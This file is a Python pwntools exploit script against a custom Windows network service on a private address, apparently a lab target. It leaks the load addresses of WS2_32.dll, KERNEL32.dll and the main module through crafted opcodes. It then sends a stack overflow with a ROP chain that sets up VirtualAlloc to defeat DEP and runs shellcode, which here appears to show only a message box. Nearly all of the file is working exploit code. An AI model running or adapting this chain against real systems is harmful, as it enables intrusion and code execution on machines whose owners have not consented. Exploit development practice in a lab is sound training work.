from pwn import *
import time


host = '192.168.1.8'
port = 9998
size = 6000
canary = 0x11223344
bigData = ""


def parseAddress(data):
   
    pattern = b'[+]'
    names = [b'WS2_32.dll', b'KERNEL32.dll', b'main']
    current = ''

    for i in names:
        if i in data:
            current = i.decode()

    address = 0

    pieces = data.split(pattern)
    address = int(pieces[2].split(b':')[1].strip(), 16)
    
    global bigData
    bigData += f'[+] {current} address: {str(hex(address))}\n'

    return address


def doLeak(dll, opcode):

    size = 200

    buf  = b''
    buf += p32(0xcccccccc)
    buf += p32(0xaabbccdd)
    buf += p32(0xeeff0102)
    buf += p32(opcode)
    buf += dll
    buf += b'A' * ((size - 1) - len(buf))


    io = remote(host, port)
    data = io.recv(1024)
    io.sendline(buf)
    data += io.recv(1024)
    data += io.recv(1024)

    io.close()

    address = parseAddress(data)


    return address





def doOverflow(ws2Addr, kernel32Address):

    size = 4000
    offset = 2012


    va  = b''              # VirtualAlloc
    va += p32(kernel32Address + 0x1f9f0)  # VirtualAlloc address
    va += p32(0x46464646)  # Shellcode return address
    va += p32(0x47474747)  # lpAddress
    va += p32(0x400)         # dwSize
    va += p32(0x1000)      # flAllocationType
    va += p32(0x40)        # flProtect


    shellcode  = b''
    shellcode += b'\xc3'
    shellcode += b'\x90' * 20
    shellcode += b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77"
    shellcode += b"\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76"
    shellcode += b"\x1c\x8b\x46\x08\x8b\x7e\x20\x8b\x36\x38\x4f"
    shellcode += b"\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c"
    shellcode += b"\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea"
    shellcode += b"\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49"
    shellcode += b"\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac"
    shellcode += b"\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4"
    shellcode += b"\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb"
    shellcode += b"\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04"
    shellcode += b"\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08"
    shellcode += b"\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec"
    shellcode += b"\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
    shellcode += b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff"
    shellcode += b"\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33"
    shellcode += b"\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88"
    shellcode += b"\x5c\x24\x0a\x89\xe6\x56\xff\x55\x04\x89\xc2"
    shellcode += b"\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24\x52\xe8"
    shellcode += b"\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61"
    shellcode += b"\x67\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88"
    shellcode += b"\x5c\x24\x0a\x89\xe3\x68\x48\x4f\x58\x20\x68"
    shellcode += b"\x54\x45\x4e\x53\x68\x55\x47\x41\x5f\x68\x47"
    shellcode += b"\x45\x54\x53\x31\xc9\x88\x4c\x24\x0e\x89\xe1"
    shellcode += b"\x31\xd2\x52\x53\x51\x52\xff\xd0\x31\xc0\x50"
    shellcode += b"\xff\x55\x08"
    shellcode += b'\x90' * (400 - len(shellcode))


    rop  = b''
    # Shellcode return address
    rop += p32(kernel32Address + 0x0005201f)    # mov eax, esi; pop esi; pop ebp; retn 0x4
    rop += b'A' * 8                             # junk
    rop += p32(ws2Addr + 0x00008b57)         # pop ebp; ret
    rop += b'A' * 4                             # junk for retn 0x4
    rop += p32(0xffffffe8)                      # -24 to first artgument of va
    rop += p32(kernel32Address + 0x00044884)    # add eax, ebp; ret
    rop += p32(ws2Addr + 0x00017572)         # mov ecx, eax; mov eax, ecx; pop ebp; ret
    rop += b'A' * 4                             # junk for ebp
    rop += p32(kernel32Address + 0x000668da)    # xchg eax, edx; ret
    rop += p32(ws2Addr + 0x00017574)         # mov eax, ecx; pop ebp; ret
    rop += b'A' * 4                             # junk for ebp
    rop += p32(kernel32Address + 0x00022a47)    # pop ecx; ret
    rop += p32(0x000000e4)                      # random value
    rop += p32(kernel32Address + 0x000203c4)    # add eax, ecx; ret
    rop += p32(ws2Addr + 0x00017572)         # mov ecx, eax; mov eax, ecx; pop ebp; ret
    rop += b'A' * 4                             # junk for ebp
    rop += p32(kernel32Address + 0x0002325d)    # mov [edx], eax; mov eax, 3; ret

    #lpBaseAddress
    rop += p32(kernel32Address + 0x0005e8b2)    # inc edx; cdl; dec ecx; retn 0x4
    rop += p32(kernel32Address + 0x0005e8b2)    # inc edx; cdl; dec ecx; retn 0x4
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x0005e8b2)    # inc edx; cdl; dec ecx; retn 0x4
    rop += b'A' * 4
    rop += p32(kernel32Address + 0x0005e8b2)    # inc edx; cdl; dec ecx; retn 0x4
    rop += b'A' * 4
    rop += p32(ws2Addr + 0x00017574)         # mov eax, ecx; pop ebp; ret
    rop += b'A' * 8                             # junk for ebp
    rop += p32(ws2Addr + 0x00008b57)         # pop ebp; ret
    rop += p32(0x00000004)                      # go to shellcode address
    rop += p32(kernel32Address + 0x00044884)    # add eax, ebp; ret
    rop += p32(ws2Addr + 0x00017572)         # mov ecx, eax; mov eax, ecx; pop ebp; ret
    rop += b'A' * 4                             # junk for ebp
    rop += p32(kernel32Address + 0x0002325d)    # mov [edx], eax; mov eax, 3; ret

    # flAllocationType
    rop += p32(ws2Addr + 0x00017574)         # mov eax, ecx; pop ebp; ret
    rop += b'A' * 4                             # junk for ebp
    rop += p32(kernel32Address + 0x00022a47)    # pop ecx; ret
    rop += p32(0xffffff1c)                      # random value
    rop += p32(kernel32Address + 0x000203c4)    # add eax, ecx; ret
    rop += p32(kernel32Address + 0x00022a47)    # pop ecx; ret
    rop += p32(0x00000008)                      # go to flAllocationType - 4 argument
    rop += p32(kernel32Address + 0x000203c4)    # add eax, ecx; ret
    rop += p32(ws2Addr + 0x0002e0a1)         # pop ebx; ret
    rop += p32(0x1000)                          # MEM_COMMIT | MEM_RESERVE
    rop += p32(kernel32Address + 0x00039083)    # mov [eax+4], ebx; ret

    # Jump to VirtualAlloc
    rop += p32(kernel32Address + 0x00022a47)    # pop ecx; ret
    rop += p32(0xfffffff0)                      # go to virtualalloc - 4 argument
    rop += p32(kernel32Address + 0x000203c4)    # add eax, ecx; ret
    rop += p32(kernel32Address + 0x0005211a)    # xchg eax,ebp; ret
    rop += p32(kernel32Address + 0x00020566)    # mov esp,ebp; pop ebp; ret


    buf  = b''
    buf += p32(0xcccccccc)
    buf += p32(0xaabbccdd)
    buf += p32(0xeeff0102)
    buf += p32(902)
    buf += b'A' * (offset - len(buf) - len(va))
    buf += va
    buf += p32(kernel32Address + 0x0006e6dd)    # push esp; pop esi; ret
    buf += rop
    buf += shellcode
    buf += b'C' * ((size - 1) - len(buf))

    io = remote(host, port)
    io.recv(1024)
    io.sendline(buf)




def main():

    ws2Addr = doLeak(b'WS2_32.dll', 899)
    kernel32Address = doLeak(b'KERNEL32.dll', 901)
    mainAddr = doLeak(b'main', 900)

    global bigData
    print(bigData)
    doOverflow(ws2Addr, kernel32Address)




if __name__ == '__main__':
    main()
